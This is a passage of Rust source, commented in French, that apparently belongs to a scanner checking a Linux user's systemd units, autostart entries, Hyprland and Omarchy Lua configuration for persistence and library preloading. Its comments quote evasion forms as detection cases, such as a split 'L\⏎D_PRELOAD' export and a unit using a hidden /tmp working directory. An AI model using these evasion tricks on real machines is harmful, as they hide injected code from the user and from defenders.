    let mut hypr = fichiers_de_hypr(&h.join(".config/hypr"), &mut parcours);
    // XDG_CONFIG_HOME et XDG_DATA_HOME déplacés : systemd et Hyprland y lisent aussi (vérification de la campagne E,
    // N7 ; M-d ne couvrait que le suivi d'une unité déjà acceptée).
    if let Some(c) = &r.config {
        for d in ["systemd/user", "systemd/user.control"] {
            demarrage.extend(fichiers_et_liens(&r.sous(&c.join(d)), &UNITES, &mut liens));
        }
        demarrage.extend(fichiers_de(&r.sous(&c.join("autostart")), &["desktop"]));
        hypr.extend(fichiers_de_hypr(&r.sous(&c.join("hypr")), &mut parcours));
    }
    if let Some(d) = &r.donnees {
        demarrage.extend(fichiers_et_liens(&r.sous(&d.join("systemd/user")), &UNITES, &mut liens));
    }
    // Les services D-Bus de la session que le compte écrit : leur « Exec= » se lit comme une ligne d'unité, plus
    // stricte que le bus (ni code « % » ni variable chez lui : un tel mot est levé, jamais tu).
    for d in r.dossiers_dbus() {
        demarrage.extend(fichiers_de(d, &["service"]));
    }
    // Le dossier de la session : systemd y lit des unités de l'utilisateur (« systemctl --user --runtime », celles de
    // « systemd-run --user » dans transient/, celles des générateurs). Effacées à l'arrêt, elles lancent quand même
    // des programmes pendant la session : jugées par leur contenu, comme les autres (`Ajout::Session`).
    if let Some(s) = &r.session {
        for d in DOSSIERS_DE_LA_SESSION {
            demarrage.extend(fichiers_et_liens(&r.sous(&s.join(d)), &UNITES, &mut liens));
        }
    }
    // Les dossiers que systemd lit en plus des habituels (user.attached, XDG_DATA_DIRS, XDG_CONFIG_DIRS, le dossier de
    // session de systemd quand XDG_RUNTIME_DIR mène ailleurs) : `Ajout::Dossier`.
    for d in &r.dossiers_ajoutes {
        demarrage.extend(fichiers_et_liens(d, &UNITES, &mut liens));
    }
    // Les modules d'Omarchy hors de ~/.config/hypr (deuxième vérification, N11) : leurs seuls fichiers Lua, à toute
    // profondeur, liens suivis et dits ; sous un XDG_STATE_HOME déplacé aussi (workspace-layouts.lua l'ajoute).
    let mut dossiers: Vec<(std::path::PathBuf, bool)> = MODULES_D_OMARCHY
        .iter()
        .map(|(d, masque)| (h.join(d), *masque))
        .collect();
    if let Some(e) = &r.etat {
        for (d, masque) in [
            ("default", true),
            ("hypr", true),
            ("omarchy/current/theme", false),
            ("omarchy/toggles/hypr", false),
            ("omarchy/workspace-layouts", false),
        ] {
            dossiers.push((r.sous(&e.join(d)), masque));
        }
    }
    let mut modules = Vec::new();
    let mut masques = Vec::new();
    let mut des_modules = Parcours::default();
    for (d, masque) in dossiers {
        let mut trouves = Vec::new();
        fichiers_sous(&d, &["lua"], true, 0, &mut trouves, &mut des_modules);
        trouves.retain(|f| !hypr.contains(f) && !modules.contains(f));
        if masque {
            masques.extend(trouves.iter().cloned());
        }
        modules.extend(trouves);
    }
    // Un thème range ses images où il veut, liens compris : un lien se dit seulement s'il mène à un module lu.
    des_modules
        .liens_hypr
        .retain(|l| modules.iter().any(|m| m.starts_with(l)));
    parcours.liens_hypr.append(&mut des_modules.liens_hypr);
    parcours.trop_profonds.append(&mut des_modules.trop_profonds);
    // Le moteur de dictée choisi (vérification 3, H3) : dictation-backend.lua d'Omarchy fait « dofile » de
    // <config>/<moteur>/shortcuts.lua, le moteur lu à la 1re ligne de <config>/omarchy/defaults/dictation.
    let mut configs = vec![h.join(".config")];
    configs.extend(r.config.as_ref().map(|c| r.sous(c)));
    for c in configs {
        if let Some(f) = raccourcis_de_dictee(&c)
            && !hypr.contains(&f)
            && !modules.contains(&f)
        {
            modules.push(f);
        }
    }
    hypr.extend(modules.iter().cloned());
    demarrage.extend(hypr.iter().cloned());
    let mut vus = std::collections::BTreeSet::new();
    demarrage.retain(|f| vus.insert(f.clone()));
    Demarrage {
        fichiers: demarrage,
        hypr,
        liens,
        parcours,
        modules,
        masques,
    }
}

/// Le fichier de raccourcis du moteur de dictée qu'Omarchy charge sous ce dossier de configuration, s'il existe :
/// le moteur est la 1re ligne de omarchy/defaults/dictation, coupée comme « read -r » (blancs autour) et de la forme
/// que omarchy-default-dictation accepte (`^[a-z0-9][a-z0-9-]*$`) ; une autre forme n'est pas chargée.
fn raccourcis_de_dictee(config: &Path) -> Option<std::path::PathBuf> {
    use std::io::Read as _;
    let mut debut = Vec::new();
    std::fs::File::open(config.join("omarchy/defaults/dictation"))
        .ok()?
        .take(4096)
        .read_to_end(&mut debut)
        .ok()?;
    let texte = String::from_utf8_lossy(&debut);
    let moteur = texte.lines().next()?.trim_matches([' ', '\t']);
    let premier = moteur.chars().next()?;
    let forme = (premier.is_ascii_lowercase() || premier.is_ascii_digit())
        && moteur
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-');
    let f = config.join(moteur).join("shortcuts.lua");
    (forme && std::fs::metadata(&f).is_ok_and(|m| m.is_file())).then_some(f)
}

/// Dans les fichiers de configuration : un préchargement, ou une commande suspecte hors des lignes de démarrage
/// (jugées à part). Chaque fichier se lit selon sa sorte (`sortes`, Hyprland sinon) : ceux au format de systemd par
/// les lignes de `read_line` (« \r » et NUL finissent aussi une ligne ; le retrait proposé est la ligne écrite
/// entière) ; le commentaire est celui de son lecteur (`commentaire_selon`, R-2, R-3).
fn juger_configuration(
    configuration: &[std::path::PathBuf],
    sortes: &[(std::path::PathBuf, Variables)],
    demarrage: &[std::path::PathBuf],
    h: &Path,
    t: &mut Lancements,
) {
    let (session, lue) = (home(), t.r.maison.to_string_lossy().into_owned());
    let maisons = [session.as_str(), lue.as_str()];
    for f in configuration {
        let Some(lu) = lire(f, h, t) else {
            continue;
        };
        // La sorte du fichier, qui dit son lecteur : un fichier de Hyprland (ajouté hors de `sortes`) sinon.
        let sorte = sortes.iter().find(|(c, _)| c == f).map_or(Variables::Hypr, |(_, s)| *s);
        let systemd = format_systemd(sorte);
        // Au format de systemd, chaque ligne telle que `read_line` la lit (« \r », NUL finissent aussi une ligne),
        // jugée à la ligne écrite qui la porte ; un commentaire selon la règle de systemd, et « unset » n'y est qu'un
        // mot (R-2 : « A=1 \⏎# note⏎unset LD_PRELOAD=… » pose LD_PRELOAD dans user.conf).
        let ecrites: Vec<&str> = lu.texte.lines().collect();
        let lignes: Vec<(usize, &str, &str)> = if systemd {
            lignes_lues_numerotees(&lu.texte)
                .into_iter()
                .map(|(n, l)| (n, ecrites.get(n).copied().unwrap_or(l), l))
                .collect()
        } else {
            ecrites.iter().enumerate().map(|(n, e)| (n, *e, *e)).collect()
        };
        for (n, ecrite, l) in lignes {
            if prechargement_selon(l, sorte) {
                t.sources
                    .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                t.retraits.push(retrait(f, &lu.texte, ecrite));
                let d = designes::prechargement(l);
                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, false, Sorte::Shell);
                t.temoins.push(temoin);
                t.suspects.push(trf!(
                    "{}:{} précharge une bibliothèque (LD_PRELOAD)",
                    "{}:{} preloads a library (LD_PRELOAD)",
                    court(f, h),
                    n.saturating_add(1)
                ));
            } else if !commentaire_selon(l, sorte)
                && let Some(raison) = variable_de_configuration(l, &maisons)
                    .or_else(|| (!demarrage.contains(f)).then(|| commande_suspecte(l, false)).flatten())
            {
                t.sources
                    .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                t.retraits.push(retrait(f, &lu.texte, ecrite));
                let d = designes::commande(l, designes::Contexte::Shell);
                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, true, Sorte::Shell);
                t.temoins.push(temoin);
                t.suspects.push(trf!(
                    "{}:{} : {raison}",
                    "{}:{}: {raison}",
                    court(f, h),
                    n.saturating_add(1)
                ));
            }
        }
        juger_lignes_jointes(f, &lu, sorte, demarrage, h, t);
    }
}

/// Pourquoi une ligne d'un fichier de configuration pose une variable de recherche ou d'injection qui mène à un
/// dossier caché ou temporaire (`variable_suspecte`), ou `None` : « NOM=valeur » (environment.d, profils, avec
/// « export », « declare -x »), « setenv NOM valeur » (csh), « set -gx NOM valeur » (fish), et les variables de
/// « DefaultEnvironment= » et « ManagerEnvironment= » (user.conf de systemd ; relecture adverse 2, N8).
fn variable_de_configuration(ligne: &str, maisons: &[&str]) -> Option<&'static str> {
    let l = ligne.trim();
    // systemd ôte les blancs autour du « = » (vérification 3, P10 : « DefaultEnvironment = A=b »).
    if let Some((cle, v)) = l.split_once('=')
        && ["DefaultEnvironment", "ManagerEnvironment"].contains(&cle.trim_end())
    {
        return commandes_de_systemd(v.trim_start())?
            .into_iter()
            .flatten()
            .find_map(|mot| {
                let (nom, valeur) = affectation(&mot)?;
                variable_suspecte(nom, valeur, maisons)
            });
    }
    for debut in ["setenv ", "set -gx ", "set -x ", "set -Ux "] {
        if let Some(reste) = l.strip_prefix(debut) {
            let (nom, valeur) = reste.trim().split_once([' ', '\t'])?;
            return variable_suspecte(nom, valeur.trim(), maisons);
        }
    }
    let l = ["export ", "declare -x ", "typeset -x ", "readonly "]
        .iter()
        .find_map(|d| l.strip_prefix(d))
        .unwrap_or(l)
        .trim_start();
    let (nom, valeur) = affectation(l)?;
    // La valeur jusqu'au premier blanc hors guillemets : « A=/x b » lance « b » avec A posée.
    let valeur = valeur.split_once([' ', '\t', ';']).map_or(valeur, |(v, _)| v);
    variable_suspecte(nom, valeur, maisons)
}

/// Les lignes continuées par « \ », jointes comme les lit le shell : « export L\⏎D_PRELOAD=… » précharge sans
/// qu'aucune ligne écrite ne nomme LD_PRELOAD. Seulement ce qu'aucune de leurs lignes n'a déjà levé ; sans retrait
/// proposé (retirer la seule première ligne laisserait la suite). Au format de systemd (`systemd`), les lignes se
/// coupent aussi sur un retour chariot seul (`enregistrements`).
fn juger_lignes_jointes(
    fichier: &Path,
    lu: &Lecture,
    sorte: Variables,
    demarrage: &[std::path::PathBuf],
    maison: &Path,
    t: &mut Lancements,
) {
    // Au format de systemd, le texte coupé aussi sur chaque retour chariot seul (« #x⏎L\⏎D_PRELOAD=… » : le
    // commentaire s'arrête au retour chariot, la suite se joint) ; chaque enregistrement garde le numéro de la ligne
    // écrite qui le porte.
    let systemd = format_systemd(sorte);
    let (texte, numeros): (std::borrow::Cow<'_, str>, Vec<usize>) = if systemd {
        (
            coupe_comme_systemd(&lu.texte, Variables::Systemd).into(),
            lignes_lues_numerotees(&lu.texte)
                .into_iter()
                .map(|(n, _)| n.saturating_add(1))
                .collect(),
        )
    } else {
        (lu.texte.as_str().into(), Vec::new())
    };
    for (premiere, physiques, jointe) in lignes_du_shell(&texte, sorte) {
        if physiques.len() < 2 {
            continue;
        }
        let premiere = if systemd {
            numeros.get(premiere.saturating_sub(1)).copied().unwrap_or(premiere)
        } else {
            premiere
        };
        let n = premiere.saturating_sub(1);
        let raison = if prechargement_selon(&jointe, sorte) {
            if physiques.iter().any(|(_, l)| prechargement_selon(l, sorte)) {
                continue;
            }
            None
        } else if !commentaire_selon(&jointe, sorte)
            && !demarrage.iter().any(|d| d == fichier)
            && let Some(raison) = commande_suspecte(&jointe, false)
        {
            if physiques.iter().any(|(_, l)| commande_suspecte(l, false).is_some()) {
                continue;
            }
            Some(raison)
        } else {
            continue;
        };
        t.sources.push(source_de(
            &crate::modele::id::chemin(&fichier.to_string_lossy()),
            &jointe,
        ));
        t.retraits.push(None);
        let (d, commande) = match raison {
            None => (designes::prechargement(&jointe), false),
            Some(_) => (designes::commande(&jointe, designes::Contexte::Shell), true),
        };
        let temoin = temoin_de_ligne(t, fichier, n, lu, &jointe, d, commande, Sorte::Shell);
        t.temoins.push(temoin);
        t.suspects.push(match raison {
            None => trf!(
                "{}:{} précharge une bibliothèque (LD_PRELOAD)",
                "{}:{} preloads a library (LD_PRELOAD)",
                court(fichier, maison),
                premiere
            ),
            Some(raison) => trf!("{}:{} : {raison}", "{}:{}: {raison}", court(fichier, maison), premiere),
        });
    }
}

/// Dans les fichiers de démarrage : chaque programme lancé, jugé comme un lancement. Une unité se lit par ses lignes
/// telles que systemd les assemble (`lignes_de_systemd`) ; un .desktop par ses lignes écrites, puis par celles que
/// joint systemd-xdg-autostart-generator ; un fichier de Hyprland par ses lignes, raccourcis compris, et un fichier
/// Lua aussi par ses appels qui lancent une commande (`appels_lua`).
fn juger_demarrage(demarrage: &[std::path::PathBuf], h: &Path, t: &mut Lancements) {
    // Un fichier de Hyprland : un .conf de ses dossiers, ou tout fichier qu'il lit par « source = » quelle que soit
    // son extension (relecture adverse, C6 : « extra.inc » aussi).
    let de_hypr = |f: &Path, r: &Releveur| {
        (r.dans_hypr(f) && a_l_extension(f, "conf"))
            || (r.hypr_inclus.iter().any(|i| i == f) && !a_l_extension(f, "lua"))
    };
    let variables = variables_de_hypr(demarrage.iter().filter(|f| de_hypr(f, &t.r)));
    for f in demarrage {
        let Some(lu) = lire(f, h, t) else {
            continue;
        };
        let sorte = Sorte::de(f, &t.r);
        let ecrites: Vec<&str> = if a_l_extension(f, "lua") {
            lignes_de_lua(&lu.texte)
        } else {
            lu.texte.lines().collect()
        };
        // B-1 (revérification 7) : une entrée de bureau que le compte peut écrire, sous une forme que systemd lit
        // autrement qu'un autre lanceur, se lève pour sa forme : ce qu'elle lance dépend de qui la lit. Un réglage
        // (`Ajout::Reglage`), jamais déclarable.
        if sorte == Sorte::Bureau && !de_root_seul(f) {
            for (n, forme) in formes_trompeuses(&lu.texte) {
                let ligne = ecrites.get(n).copied().unwrap_or_default();
                let raison = trf!(
                    "entrée de démarrage écrite sous une forme trompeuse : {forme} ; un autre lanceur peut la lire autrement",
                    "startup entry written in a misleading form: {forme}; another launcher may read it differently"
                );
                lever(
                    t,
                    f,
                    &lu,
                    n,
                    ligne,
                    ligne,
                    true,
                    Sorte::Ajoutee(Ajout::Reglage),
                    false,
                    &raison,
                );
            }
        }
        let mut levees: Vec<usize> = Vec::new();
        let unite = matches!(
            sorte,
            Sorte::Unite { .. } | Sorte::Ajoutee(Ajout::Session | Ajout::Dossier | Ajout::DBus)
        );
        if de_hypr(f, &t.r) {
            juger_hypr(t, f, &lu, &ecrites, sorte, &variables);
        } else if !unite {
            // Un fichier Lua se lit par ses appels (`juger_lua`), qui coupent chaque commande comme le shell ; ici,
            // ses seuls mots.
            let lecteur = if sorte == Sorte::Bureau {
                Lecteur::Bureau(dossier_de_bureau(&lu.texte))
            } else if a_l_extension(f, "lua") {
                Lecteur::Texte
            } else {
                Lecteur::Brut
            };
            for (n, l) in ecrites.iter().enumerate() {
                if let Some((commande, ambigue)) = commande_lancee_lue(l)
                    && juger_lancement(t, f, &lu, n, l, &commande, ambigue, sorte, true, &lecteur)
                {
                    levees.push(n);
                }
            }
        }
        if unite || sorte == Sorte::Bureau {
            let utilisateur = !matches!(sorte, Sorte::Unite { utilisateur: false });
            let lecteur = if sorte == Sorte::Bureau {
                Lecteur::Bureau(dossier_de_bureau(&lu.texte))
            } else {
                let base = Codes::de(utilisateur, &t.r);
                let sauvegarde = (utilisateur && f.file_name().is_some_and(|n| n == crate::sauvegarde::SERVICE))
                    .then(|| crate::sauvegarde::sauvegarde_posee(&lu.texte))
                    .flatten();
                Lecteur::Systemd(Codes {
                    variables: variables_fusionnees(f, &lu.texte, &base, &t.r),
                    courant: dossier_courant(f, &lu.texte, &base, &t.r),
                    sauvegarde_completee: sauvegarde.is_some()
                        && complements_du_compte(&t.r, crate::sauvegarde::SERVICE),
                    sauvegarde_environnement: sauvegarde
                        .as_ref()
                        .is_some_and(|p| environnement_change_la_sauvegarde(&t.r, p.env.is_some())),
                    sauvegarde,
                    ..base
                })
            };
            // Une unité que le compte peut écrire : chaque clé dans la liste permise de sa section (vérification 3).
            let a_juger = unite && !de_root_seul(f);
            let (lue, session) = (t.r.maison.to_string_lossy().into_owned(), home());
            let maisons = [session.as_str(), lue.as_str()];
            let mut section: Option<String> = None;
            for logique in lignes_de_systemd(&lu.texte) {
                if let Some(nom) = logique.texte.strip_prefix('[').and_then(|x| x.strip_suffix(']')) {
                    section = Some(nom.to_string());
                    continue;
                }
                let n = logique.numero.saturating_sub(1);
                // Écrite sur une seule ligne, telle que systemd la lit : la ligne elle-même, comme avant ce lot.
                let simple = logique.lues == 1
                    && ecrites.get(n) == Some(&logique.premiere.as_str())
                    && logique.premiere.trim_matches([' ', '\t']) == logique.texte;
                let ligne = if simple { &logique.premiere } else { &logique.texte };
                let s = if simple || matches!(sorte, Sorte::Ajoutee(_)) {
                    sorte
                } else {
                    Sorte::Ajoutee(Ajout::Jointe {
                        bureau: sorte == Sorte::Bureau,
                        utilisateur,
                    })
                };
                // La liste permise d'abord, la porte unique du silence (vérification 4, D1) : sa raison est celle
                // qui se montre. `reglage_suspect` vient ensuite, en filet : une ligne que la liste laisserait passer
                // (ou celle d'une unité à root seul, qu'elle ne juge pas) reste levée par lui. Les deux lèvent un
                // réglage (`Ajout::Reglage`), jamais déclarable, dont le refus nomme la clé.
                if a_juger && let Lecteur::Systemd(codes) = &lecteur {
                    let s = permise::Systeme {
                        racine: &t.r.racine,
                        maison: &lue,
                        maisons: &maisons,
                        courant: codes.courant.as_deref(),
                        noms_des_lieux: std::cell::OnceCell::new(),
                        relatif: std::cell::OnceCell::new(),
                    };
                    if let Err(e) = permise::directive(&s, codes, section.as_deref(), &logique.texte) {
                        lever(
                            t,
                            f,
                            &lu,
                            n,
                            ligne,
                            &logique.texte,
                            true,
                            Sorte::Ajoutee(Ajout::Reglage),
                            simple,
                            e.raison(),
                        );
                        continue;
                    }
                }
                if unite && let Some(raison) = reglage_suspect(&logique.texte, &t.r) {
                    lever(
                        t,
                        f,
                        &lu,
                        n,
                        ligne,
                        &logique.texte,
                        true,
                        Sorte::Ajoutee(Ajout::Reglage),
                        simple,
                        raison,
                    );
                    continue;
                }
                let Some((commande, ambigue)) = commande_lancee_lue(&logique.texte) else {
                    continue;
                };
                if simple && sorte == Sorte::Bureau {
                    continue;
                }
                juger_lancement(t, f, &lu, n, ligne, &commande, ambigue, s, simple, &lecteur);
            }
        }
        if a_l_extension(f, "lua") && (t.r.dans_hypr(f) || t.r.modules.iter().any(|m| m == f)) {
            juger_lua(t, f, h, &lu, &ecrites, &levees);
        }
    }
}

/// Un fichier des bascules ou des dispositions d'Omarchy dont le nom a un point avant « .lua » (vérification 3,
/// H2) : require_all.lua en fait « require("a.b") », que Lua cherche en a/b.lua dans tout package.path ; le
/// fichier jugé n'est pas celui qui est chargé.
fn charge_sous_un_autre_nom(r: &Releveur, f: &Path) -> bool {
    const DOSSIERS: [&str; 2] = ["omarchy/toggles/hypr", "omarchy/workspace-layouts"];
    let mut etats = vec![r.maison.join(".local/state")];
    etats.extend(r.etat.as_ref().map(|e| r.sous(e)));
    let premier_niveau = f
        .parent()
        .is_some_and(|p| etats.iter().any(|e| DOSSIERS.iter().any(|d| p == e.join(d))));
    let nom = f.file_name().map(|n| n.to_string_lossy()).unwrap_or_default();
    premier_niveau && nom.strip_suffix(".lua").is_some_and(|tige| tige.contains('.'))
}

/// Un fichier Lua que Vanguard lit : sous les dossiers de Hyprland, ou un module d'Omarchy relevé ou levé à part
/// (`MODULES_D_OMARCHY`).
fn lua_lu(r: &Releveur, f: &Path) -> bool {
    a_l_extension(f, "lua")
        && (r.dans_hypr(f)
            || r.modules.iter().any(|m| m == f)
            || MODULES_D_OMARCHY.iter().any(|(d, _)| f.starts_with(r.maison.join(d))))
}

/// Pourquoi ce qu'un appel Lua charge (« require "x.y" », « dofile "…" » écrits en toutes lettres) n'est pas vérifié,
/// ou `None` (vérification 2, mineurs, N11) : le premier fichier que le chemin de modules d'Omarchy trouve
/// (~/.local/state/?.lua, ~/.config/?.lua, puis /usr/share/omarchy/?.lua ; bootstrap.lua), ou à défaut celui du
/// dossier de Hyprland, doit être lu ; introuvable, il vient d'ailleurs (LUA_PATH, dossier courant) ou manque.
fn charge_hors_lecture(r: &Releveur, appel: &AppelLu) -> Option<&'static str> {
    let omarchy = r.sous(Path::new(OMARCHY));
    let hors = || {
        tr!(
            "code Lua chargé d'un fichier que Vanguard ne lit pas (hors de ~/.config/hypr et des modules d'Omarchy) : non vérifié",
            "Lua code loaded from a file Vanguard does not read (outside ~/.config/hypr and Omarchy's modules): not checked"
        )
    };
    let introuvable = || {
        tr!(
            "module Lua introuvable dans les dossiers connus (~/.config/hypr, ~/.local/state, ~/.config, /usr/share/omarchy) : chargé d'ailleurs (LUA_PATH, dossier courant) ou absent, non vérifié",
            "Lua module not found in the known folders (~/.config/hypr, ~/.local/state, ~/.config, /usr/share/omarchy): loaded from elsewhere (LUA_PATH, current folder) or missing, not checked"
        )
    };
    let existe = |f: &Path| std::fs::metadata(f).is_ok();
    for nom in &appel.modules {
        if nom.is_empty() || nom.contains(['/', '\\']) || nom.split('.').any(str::is_empty) {
            return Some(introuvable());
        }
        let rel = format!("{}.lua", nom.replace('.', "/"));
        let trouve = [r.maison.join(".local/state"), r.maison.join(".config"), omarchy.clone()]
            .into_iter()
            .chain(std::iter::once(r.maison.join(".config/hypr")))
            .chain(r.config.as_ref().map(|c| r.sous(&c.join("hypr"))))
            .map(|d| d.join(&rel))
            .find(|f| existe(f));
        match trouve {
            None => return Some(introuvable()),
            Some(f) if !f.starts_with(&omarchy) && !lua_lu(r, &f) => return Some(hors()),
            Some(_) => {}
        }
    }
    for chemin in &appel.fichiers {
        let simple = chemin_simplifie(chemin);
        let f = if let Some(rel) = simple.strip_prefix("$HOME/").or_else(|| simple.strip_prefix("~/")) {
            r.maison.join(rel)
        } else if simple.starts_with('/') && !simple.contains("/../") {
            r.sous(Path::new(simple.as_str()))
        } else {
            return Some(introuvable());
        };
        if !(f.starts_with(&omarchy) || lua_lu(r, &f)) {
            return Some(hors());
        }
    }
    None
}

/// Les lignes d'un fichier Lua comptées comme Lua les compte (`jetons_lua`) : « \r » seul finit une ligne aussi.
fn lignes_de_lua(texte: &str) -> Vec<&str> {
    let octets = texte.as_bytes();
    let mut lignes = Vec::new();
    let (mut debut, mut i) = (0_usize, 0_usize);
    while let Some(&b) = octets.get(i) {
        i = i.saturating_add(1);
        if b == b'\n' || b == b'\r' {
            lignes.push(texte.get(debut..i.saturating_sub(1)).unwrap_or_default());
            if octets.get(i) == Some(&if b == b'\n' { b'\r' } else { b'\n' }) {
                i = i.saturating_add(1);
            }
            debut = i;
        }
    }
    if debut < texte.len() {
        lignes.push(texte.get(debut..).unwrap_or_default());
    }
    lignes
}

/// Juge les appels d'un fichier Lua de Hyprland (`appels_lua`) : chaque commande lue en toutes lettres comme une
/// commande lancée ; un appel qui ne se lit pas, levé (jamais tu). Une ligne déjà levée par `commande_lancee_lue`
/// (`levees`) ne se lève pas deux fois.
fn juger_lua(t: &mut Lancements, f: &Path, h: &Path, lu: &Lecture, ecrites: &[&str], levees: &[usize]) {
    if charge_sous_un_autre_nom(&t.r, f) {
        non_lu(
            f,
            h,
            t,
            tr!(
                "nom à point : Omarchy charge à sa place un autre fichier (« a.b » devient a/b.lua)",
                "dotted name: Omarchy loads another file in its place (\"a.b\" becomes a/b.lua)"
            ),
        );
    }
    let mut appels = appels_lua(&lu.texte);
    if appels.len() > APPELS_LUA_MAX {
        appels.truncate(APPELS_LUA_MAX);
        non_lu(
            f,
            h,
            t,
            tr!(
                "trop d'appels Lua pour être tous lus",
                "too many Lua calls to read them all"
            ),
        );
    }
    let mut vues: Vec<usize> = levees.to_vec();
    for appel in appels {
        let n = appel.debut;
        if vues.contains(&n) {
            continue;
        }
        // Sur une seule ligne, la ligne écrite entière (celle qu'un retrait ôterait) ; sinon l'appel joint.
        let une_ligne = appel.debut == appel.fin;
        let ligne = ecrites
            .get(appel.debut..=appel.fin)
            .map_or_else(String::new, |l| l.join("\n"));
        let mut levee = false;
        let lues = appel
            .commandes
            .iter()
            .map(|c| (c, Lecteur::Brut))
            .chain(appel.textes.iter().map(|c| (c, Lecteur::Texte)));
        for (commande, lecteur) in lues {
            levee = juger_lancement(
                t,
                f,
                lu,
                n,
                &ligne,
                commande,
                false,
                Sorte::Ajoutee(Ajout::Raccourci),
                une_ligne,
                &lecteur,
            );
            if levee {
                break;
            }
        }
        let raison = appel.non_lu.or_else(|| charge_hors_lecture(&t.r, &appel));
        if !levee && let Some(raison) = raison {
            let commande = crate::ui::couper(ligne.trim(), 200);
            lever(
                t,
                f,
                lu,
                n,
                &ligne,
                &commande,
                true,
                Sorte::Ajoutee(Ajout::CleHypr),
                une_ligne,
                raison,
            );
            levee = true;
        }
        if levee {
            vues.push(n);
        }
    }
}

/// Juge les lignes d'un fichier de Hyprland telles que les lit hyprlang (`lignes_de_hyprlang`) : chaque lancement
/// (`lancements_de_hypr`, `commande_lancee_lue`) ; puis, si rien n'est levé, la ligne relue après le remplacement des
/// variables sur la valeur entière (relecture adverse, B1 : « bind = $m, Q, $e, … » où « $e » vaut « exec ») ; une
/// variable sans valeur connue dans une clé qui lance est dite ; enfin, toute autre clé dont un mot nomme un
/// programme existant d'un dossier caché ou temporaire (relecture adverse, C8).
fn juger_hypr(
    t: &mut Lancements,
    f: &Path,
    lu: &Lecture,
    ecrites: &[&str],
    sorte: Sorte,
    variables: &std::collections::BTreeMap<String, Vec<String>>,
) {
    let lue = t.r.maison.to_string_lossy().into_owned();
    let session = home();
    let maisons = [session.as_str(), lue.as_str()];
    for (n, lues, texte) in lignes_de_hyprlang(&lu.texte) {
        let simple = lues == 1;
        let ligne = if simple {
            ecrites.get(n).map_or_else(|| texte.clone(), |l| (*l).to_string())
        } else {
            texte.trim_end_matches('\r').to_string()
        };
        let sorte_de = |ajout: Option<Ajout>| {
            if simple {
                ajout.map_or(sorte, Sorte::Ajoutee)
            } else {
                Sorte::Ajoutee(Ajout::JointeHypr)
            }
        };
        let mut lancees: Vec<(String, bool, Option<Ajout>)> = lancements_de_hypr(&texte)
            .into_iter()
            .map(|(c, a, j)| (c, a, Some(j)))
            .collect();
        if lancees.is_empty()
            && let Some((c, a)) = commande_lancee_lue(&texte)
        {
            lancees.push((c, a, None));
        }
        let mut levee = false;
        for (c, a, j) in &lancees {
            let s = sorte_de(*j);
            levee |= juger_lancement(t, f, lu, n, &ligne, c, *a, s, simple, &Lecteur::Hypr(variables));
        }
        let Some(cle) = cle_de_hypr(&texte) else { continue };
        if levee || commentaire(&texte) || cle.starts_with('$') {
            continue;
        }
        let valeur = texte.split_once('=').map_or("", |(_, v)| v);
        let a_part = Sorte::Ajoutee(Ajout::CleHypr);
        // « env = NOM,valeur » : une variable de recherche ou d'injection posée pour tout ce que lance Hyprland
        // (relecture adverse 2, N8), ses variables de Hyprland remplacées.
        if cle == "env"
            && let Some((nom, v)) = valeur.split_once(',')
        {
            let formes = resoudre_hypr(v.trim(), variables).unwrap_or_else(|| vec![v.trim().to_string()]);
            if let Some(raison) = formes.iter().find_map(|v| variable_suspecte(nom.trim(), v, &maisons)) {
                lever(t, f, lu, n, &ligne, valeur.trim(), true, a_part, simple, raison);
                continue;
            }
        }
        if valeur.contains('$') {
            match resoudre_hypr(valeur, variables) {
                Some(formes) => {
                    let raison = formes.iter().find_map(|forme| {
                        let relue = format!("{cle} = {forme}");
                        let mut commandes: Vec<String> =
                            lancements_de_hypr(&relue).into_iter().map(|(c, _, _)| c).collect();
                        commandes.extend(commande_lancee_lue(&relue).map(|(c, _)| c));
                        commandes.iter().find_map(|c| {
                            commande_suspecte_chez(c, true, &maisons).or_else(|| {
                                match ligne_de_shell_suspecte(c, &maisons, !de_root_seul(f)) {
                                    Ok(raison) => raison,
                                    Err(()) => (!de_root_seul(f)).then(shell_non_lu),
                                }
                            })
                        })
                    });
                    if let Some(raison) = raison {
                        lever(t, f, lu, n, &ligne, valeur.trim(), true, a_part, simple, raison);
                        continue;
                    }
                }
                None if cle_qui_lance(cle) && cle != "source" => {
                    lever(
                        t,
                        f,
                        lu,
                        n,
                        &ligne,
                        valeur.trim(),
                        true,
                        a_part,
                        simple,
                        variable_inconnue(),
                    );
                    continue;
                }
                None => {}
            }
        }
        if lancees.is_empty() && !cle_qui_lance(cle) {
            let mots = valeur.split(|c: char| {
                c.is_whitespace() || matches!(c, ',' | '"' | '\'' | '(' | ')' | '[' | ']' | '{' | '}' | ';' | '=')
            });
            let trouve = mots.filter(|m| !m.is_empty()).find_map(|m| {
                let raison = maisons.iter().find_map(|maison| programme_cache(m, maison))?;
                executable(&t.r, m).then_some(raison)
            });
            if let Some(raison) = trouve {
                lever(t, f, lu, n, &ligne, valeur.trim(), true, a_part, simple, raison);
            }
        }
    }
}

/// Un mot d'une ligne qui nomme un fichier exécutable de l'ordinateur (« ~/ » et « $HOME/ » lus sous le dossier
/// personnel), lu sous la racine.
fn executable(r: &Releveur, mot: &str) -> bool {
    use std::os::unix::fs::PermissionsExt as _;
    let chemin = match mot.strip_prefix("~/").or_else(|| mot.strip_prefix("$HOME/")) {
        Some(reste) => r.maison.join(reste),
        None if mot.starts_with('/') => r.sous(Path::new(&chemin_simplifie(mot))),
        None => return false,
    };
    std::fs::metadata(chemin).is_ok_and(|m| m.is_file() && m.permissions().mode() & 0o111 != 0)
}

/// Pourquoi une ligne d'unité change ce qui se lance sans ligne Exec, ou `None` (relecture adverse, C5 ; relecture
/// adverse 2, N6) : une bibliothèque préchargée ou une variable de recherche ou d'injection qui mène à un dossier caché
/// ou temporaire (« Environment= », ou le contenu d'un « EnvironmentFile= »), un dossier de recherche des programmes
/// caché ou temporaire (« ExecSearchPath= »), un fichier de variables, un dossier courant, une entrée, une racine ou
/// un montage dans un dossier caché ou temporaire (ce que lit l'interpréteur lancé : « WorkingDirectory=/tmp/.x »
/// puis « /bin/sh a.sh »).
fn reglage_suspect(ligne: &str, r: &Releveur) -> Option<&'static str> {
    const CLES: [&str; 11] = [
        "Environment",
        "ExecSearchPath",
        "EnvironmentFile",
        "WorkingDirectory",
        "StandardInput",
        "StandardInputFile",
        "RootDirectory",
        "RootImage",
